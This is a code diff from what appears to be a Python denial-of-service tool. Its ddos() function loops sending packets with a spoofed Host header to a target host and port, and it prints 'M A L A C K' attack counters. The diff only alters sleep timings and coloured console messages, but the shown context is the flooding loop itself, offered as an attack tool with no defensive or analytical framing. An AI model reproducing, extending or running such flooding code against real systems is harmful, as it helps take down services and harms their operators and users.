@@ -51,13 +51,15 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                time.sleep(2)
-                print(f"{Fore.LIGHTMAGENTA_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K \033[103mSent massage\033[0m  \033[41m"+ str(attack_num)+"\033[0m \033[94m Starting\033[0m")
-                print(f"{Fore.LIGHTRED_EX}[]  {Fore.LIGHTYELLOW_EX}M A L A C K \033[7mSent massage\033[0m  \033[103m"+ str(attack_num)+"\033[0m \033[31m running.\033[0m")
+                time.sleep(1)
+                print(f"{Fore.LIGHTWHITE_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K \033[103mSent massage\033[0m  \033[41m"+ str(attack_num)+"\033[0m \033[94m Starting\033[0m")
+                time.sleep(1)
+                print(f"{Fore.LIGHTRED_EX}[]  {Fore.LIGHTWHITE_EX}M A L A C K \033[7mSent massage\033[0m  \033[103m"+ str(attack_num)+"\033[0m \033[31m Starting\033[0m")
             except socket.error:
-                time.sleep(2)
-                print(f"{Fore.BLUE}[]  {Fore.YELLOW}Connection failed \033[7m please check host\033[0m")
-                print(f"{Fore.YELLOW}[]  {Fore.BLUE}Connection failed \033[101m please check host\033[0m")
+                time.sleep(1)
+                print(f"{Fore.BLUE}[]  {Fore.YELLOW}Connection failed   \033[7m please check host\033[0m")
+                time.sleep(1) 
+                print(f"{Fore.YELLOW}[]  {Fore.BLUE}Connection failed   \033[101m please check host\033[0m")
                 break
                 s.close()
 
